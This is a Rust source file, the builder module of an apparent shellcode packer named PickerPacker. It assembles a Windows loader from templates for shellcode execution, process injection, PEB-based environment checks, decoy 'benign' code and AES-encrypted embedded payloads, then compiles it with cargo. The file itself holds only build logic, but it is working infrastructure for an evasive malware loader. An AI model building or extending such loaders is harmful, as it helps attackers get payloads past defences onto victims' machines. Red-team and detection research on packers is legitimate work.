// ============================================================================
// Builder Module - Handles compilation and file operations
// ============================================================================

use std::env;
use std::fs::File;
use std::io::prelude::*;
use crate::config::PackerConfig;
use crate::payload::PayloadType;

/// Represents a template module that can be included in the loader
#[derive(Debug)]
pub struct TemplateModule {
    pub name: &'static str,
    pub source_file: &'static str,
    pub dest_file: &'static str,
}

/// Registry of all available template modules
pub const TEMPLATE_MODULES: &[TemplateModule] = &[
    TemplateModule {
        name: "execution_mod",
        source_file: "./template/execution/mod.rs",
        dest_file: "./loader/src/execution/mod.rs",
    },
    TemplateModule {
        name: "execution_execution",
        source_file: "./template/execution/execution.rs",
        dest_file: "./loader/src/execution/execution.rs",
    },
    TemplateModule {
        name: "execution_injection",
        source_file: "./template/execution/injection.rs",
        dest_file: "./loader/src/execution/injection.rs",
    },
    TemplateModule {
        name: "utilities_mod",
        source_file: "./template/utilities/mod.rs",
        dest_file: "./loader/src/utilities/mod.rs",
    },
    TemplateModule {
        name: "utilities_utils",
        source_file: "./template/utilities/utils.rs",
        dest_file: "./loader/src/utilities/utils.rs",
    },
    TemplateModule {
        name: "checks_mod",
        source_file: "./template/checks/mod.rs",
        dest_file: "./loader/src/checks/mod.rs",
    },
    TemplateModule {
        name: "checks_checks",
        source_file: "./template/checks/checks.rs",
        dest_file: "./loader/src/checks/checks.rs",
    },
    TemplateModule {
        name: "checks_peb",
        source_file: "./template/checks/peb.rs",
        dest_file: "./loader/src/checks/peb.rs",
    },
    TemplateModule {
        name: "benign",
        source_file: "./template/benign.rs",
        dest_file: "./loader/src/benign.rs",
    },
    TemplateModule {
        name: "aes",
        source_file: "./template/aes/aes.rs",
        dest_file: "./loader/src/aes.rs",
    },
];

/// Additional files that need to be copied for specific features
#[derive(Debug)]
pub struct AdditionalFile {
    pub feature: &'static str,
    pub source: &'static str,
    pub dest: &'static str,
}

pub const ADDITIONAL_FILES: &[AdditionalFile] = &[
    AdditionalFile {
        feature: "tinyaes",
        source: "./template/aes/TinyAES.c",
        dest: "./loader/TinyAES.c",
    },
    AdditionalFile {
        feature: "tinyaes",
        source: "./template/aes/build.rs",
        dest: "./loader/build.rs",
    },
    AdditionalFile {
        feature: "ctaes",
        source: "./template/aes/CtAes.c",
        dest: "./loader/CtAes.c",
    },
    AdditionalFile {
        feature: "ctaes",
        source: "./template/aes/build.rs",
        dest: "./loader/build.rs",
    },
];

pub fn build_compile_command(config: &PackerConfig, payload_type: &PayloadType) -> String {
    let mut compile_command = "build --release ".to_string();
    
    // Only include shellcode execution features for actual shellcode payloads
    if matches!(payload_type, PayloadType::Shellcode) {
        compile_command.push_str(&format!("--features {} ", config.execution_shellcode.feature_name()));
        compile_command.push_str(&format!("--features {} ", config.injection_method.feature_name()));
    }
    
    // Add utility features
    for utility in &config.utils {
        compile_command.push_str(&format!("--features {} ", utility.feature_name()));
    }
    
    // Add check features
    for check in &config.checks {
        compile_command.push_str(&format!("--features {} ", check.feature_name()));
    }
    
    if let Some(encryption) = config.encrypt {
        compile_command.push_str(&format!("--features {} ", encryption.feature_name()));
    }
    
    compile_command.push_str("--features embedded ");
    compile_command.push_str("--manifest-path ./loader/Cargo.toml");
    compile_command.push_str(" --target x86_64-pc-windows-msvc");
    
    compile_command
}

pub fn setup_loader_directory() -> Result<(), std::io::Error> {
    // Check if loader directory exists, create if not
    let loader_exists = std::path::Path::new("loader").exists();
    
    if !loader_exists {
        println!("[*] Loader directory not found, creating...");
    }
    
    std::fs::create_dir_all("loader")?;
    std::fs::create_dir_all("loader/src")?;
    std::fs::create_dir_all("loader/src/execution")?;
    std::fs::create_dir_all("loader/src/utilities")?;
    std::fs::create_dir_all("loader/src/checks")?;
    
    // Copy Cargo.toml from template to loader directory
    let template_cargo = "template/Cargo.toml";
    let loader_cargo = "loader/Cargo.toml";
    
    if std::path::Path::new(template_cargo).exists() {
        if !loader_exists {
            println!("[*] Copying Cargo.toml from template to loader directory...");
        }
        std::fs::copy(template_cargo, loader_cargo)?;
    } else {
        eprintln!("[-] Warning: template/Cargo.toml not found");
    }
    
    Ok(())
}

/// Copy a single template module file
fn copy_template_module(module: &TemplateModule) -> Result<(), std::io::Error> {
    std::fs::copy(module.source_file, module.dest_file)?;
    Ok(())
}

/// Check if a module should be included based on configuration
fn should_include_module(module_name: &str, config: &PackerConfig) -> bool {
    match module_name {
        "execution_mod" | "execution_execution" | "execution_injection" => true,
        "benign" => true,  // Always include benign code
        "aes" => config.encrypt.is_some(),
        "utilities_mod" | "utilities_utils" => !config.utils.is_empty(),
        "checks_mod" | "checks_checks" | "checks_peb" => !config.checks.is_empty(),
        _ => false,
    }
}

/// Copy all required template modules based on enabled features
pub fn copy_template_files(config: &PackerConfig) -> Result<(), std::io::Error> {
    
    // Copy modules based on configuration
    for module in TEMPLATE_MODULES {
        if should_include_module(module.name, config) {
            copy_template_module(module)?;
        }
    }
    
    // Copy additional files (like C source, build scripts)
    for file in ADDITIONAL_FILES {
        if should_copy_additional_file(file.feature, config) {
            std::fs::copy(file.source, file.dest)?;
        }
    }
    
    Ok(())
}

/// Display summary of enabled features and modules
pub fn display_feature_summary(config: &PackerConfig) {
    println!("\n[*] ===== Feature Summary =====");
    
    let mut features = Vec::new();
    
    // Add utility features first
    for utility in &config.utils {
        features.push(utility.display_name());
    }
    
    // Add check features
    for check in &config.checks {
        features.push(check.display_name());
    }
    
    features.push(config.execution_shellcode.display_name());
    features.push(config.injection_method.display_name());
    
    if let Some(encryption) = config.encrypt {
        features.push(encryption.display_name());
    }
    features.push("Embedded Payload");
    
    if features.is_empty() {
        println!("[*] No additional features enabled");
    } else {
        for feature in features {
            println!("[+] {}", feature);
        }
    }
    
    println!("[*] ============================\n");
}

/// Check if additional files should be copied based on feature
fn should_copy_additional_file(feature: &str, config: &PackerConfig) -> bool {
    use crate::config::EncryptionMethod;
    
    match feature {
        "tinyaes" => config.encrypt == Some(EncryptionMethod::TinyAES),
        "ctaes" => config.encrypt == Some(EncryptionMethod::CTAES),
        _ => false,
    }
}

pub fn write_loader_stub(loader_stub: &str) -> Result<(), std::io::Error> {
    let mut file = File::create("./loader/src/main.rs")?;
    file.write_all(loader_stub.as_bytes())?;
    Ok(())
}

pub fn compile_loader(compile_command: &str) -> Result<(), Box<dyn std::error::Error>> {
    let path_to_cargo_project = env::current_dir()?;
    env::set_current_dir(&path_to_cargo_project)?;
    
    let output = std::process::Command::new("cargo")
        .env("CFLAGS", "-lrt")
        .env("LDFLAGS", "-lrt")
        .env("RUSTFLAGS", "-C target-feature=+crt-static")
        .env("RUSTFLAGS", "-A warnings")
        .args(compile_command.split_whitespace())
        .output()?;
    
    if output.status.success() {
        Ok(())
    } else {
        eprintln!("[-] Compilation failed!\n");
        eprintln!("{}", String::from_utf8_lossy(&output.stderr));
        let error_message = String::from_utf8_lossy(&output.stderr);
        Err(Box::new(std::io::Error::other(error_message.to_string())))
    }
}

pub fn move_and_rename_executable() -> Result<String, std::io::Error> {
    let source_path = "./loader/target/x86_64-pc-windows-msvc/release/PickerPacker.exe";
    let dest_path = "./PickerPacker_Packed.exe";
    std::fs::copy(source_path, dest_path)?;
    Ok(dest_path.to_string())
}